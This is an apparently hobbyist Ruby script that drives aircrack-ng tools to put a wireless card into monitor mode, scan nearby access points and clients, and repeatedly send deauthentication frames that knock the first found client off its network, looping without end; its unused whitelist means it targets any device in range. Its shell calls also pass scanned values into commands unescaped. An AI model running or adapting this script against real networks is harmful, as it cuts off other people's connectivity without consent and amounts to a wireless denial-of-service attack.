require 'securerandom'
require 'timeout'
# require 'byebug'
class Wifi
  def initialize(iface, mon_iface)
    @ifname = iface
    @mon_iface = mon_iface
  end

  def start_mon()
    puts "starting mon mode"
    monmode_results = `airmon-ng start #{@ifname}`
    puts "results: #{monmode_results}"

    #check if the network was put into mon
    if monmode_results.include? @mon_iface
      puts "#{@ifname} now in mon mode!"
    else
      raise "Network interface: unable to start"
    end
  end

  def stop_mon()
    puts "stoping mon mode"
    monmode_results = `airmon-ng stop #{@mon_iface}`

    puts "results: #{monmode_results}"

    #check if the network was put into mon
    if !monmode_results.include? 'xxx'
      puts "SUCCESS"
    else
      raise "Network interface: unable to stop"
    end
  end

  def dump(time)
    puts "dumping"
    temp_filename = SecureRandom.hex(10)
    puts "started #{temp_filename}"

    status = Timeout::timeout(10) {
      `timeout #{time}s airodump-ng #{@mon_iface}  --output-format "csv" -w "./dumps/#{temp_filename}" & echo "closing airodump..." & echo "closing scan."`
    } rescue Timeout::Error
puts "Files #{temp_filename}"
    accesspoints = []
    format = []
    File.foreach("dumps/#{temp_filename}-01.csv") { |line|
      next if line.length < 3
       if line.include? "BSSID, First time seen,"
         format = line.split(',').map{ |key| key.downcase.split(' ').join('_').strip}
         next
       else
         break if line.include? "Station MAC, First time seen,"
         accesspoints << Hash[format.zip(line.split(','))]
       end
      #  print "--#{line}--"
     }
     return Dump.new(temp_filename)

  end

  def disconnect(client)
    puts "\n\nDisconnecting"
    `aireplay-ng -0 5  --ignore-negative-one -a #{client.bssid} -c #{client.station_mac} #{@mon_iface}`
  end

  def self.read_dump
    File.foreach("example.csv") do |line|
      print "GOT", line, "{[#{line.split.length}]}"
    end
  end
end


class Dump
  def initialize(filename)
    @filename = filename
  end

  def read
    accesspoints = []
    clients = []
    format = []
    parsing_accesspoints = true # reads accesspoints first
    File.foreach("dumps/#{@filename}-01.csv") { |line|
      next if line.length < 3
       if line.include? "BSSID, First time seen,"
         format = line.split(',').map{ |key| key.downcase.split(' ').join('_').strip}
         next
       end
        if line.include? "Station MAC, First time seen," #move on to cleints
          parsing_accesspoints = false
          format = line.split(',').map{ |key| key.downcase.split(' ').join('_').strip}
          next
        end
        if parsing_accesspoints
          accesspoints << Hash[format.zip(line.split(','))]
        else
          # clients << Hash[format.zip(line.split(','))]
          params = Hash[format.zip(line.split(','))]
          puts params
          clients << Client.new(params['station_mac'], params['bssid'])

       end
      #  print "--#{line}--"
     }
     {'accesspoints' => accesspoints, 'clients' => clients}
  end

  def print
    puts "\n\nDUMP ID #{@filename}"
    puts "Clients"
    points = read
    points['clients'].each do |client|
      puts "bssid\t#{client.bssid}\tstation mac\t#{client.station_mac}"
    end
    puts "\naccesspoints"
    points['accesspoints'].each do |point|
      puts "bssid\t#{point['bssid']}\tessid\t#{point['essid']}"
    end
  end

end

class Client
  attr_accessor :station_mac, :bssid
  def initialize(station_mac, bssid)
    @station_mac = station_mac
    @bssid = bssid
  end
end

class Accesspoint
  def initialize(station, essid)
    @station = station
    @essid = essid
  end
end

class Slappy
  def self.whitelist
    ['00:c0:ca:83:06:70']
  end


  def self.start
    wifi = Wifi.new('wlx00c0ca830670', 'wlan0mon')
    wifi.start_mon
    # points = wifi.dump(5)
    points = Dump.new "e5c66210f3bff65823af"
    # wifi.stop_mon

    points.print
    wifi.disconnect points.read['clients'][0]
    start
  end
end
Slappy.start
# wifi = Wifi.new('wlx00c0ca830670', 'wlan0mon')
# wifi.start_mon
# # points = wifi.dump(5)
# points = Dump.new "e5c66210f3bff65823af"
# # wifi.stop_mon
#
# points.print
# wifi.disconnect points.read['clients'][0]
# Wifi.stop_mon
# Wifi.start_mon
# points = Wifi.dump
# Wifi.stop_mon
# # Probe.read_dump
# puts points
# puts "%%%"


# dump = Dump.new('6acd158bc43227b16c5c')
# puts dump.read
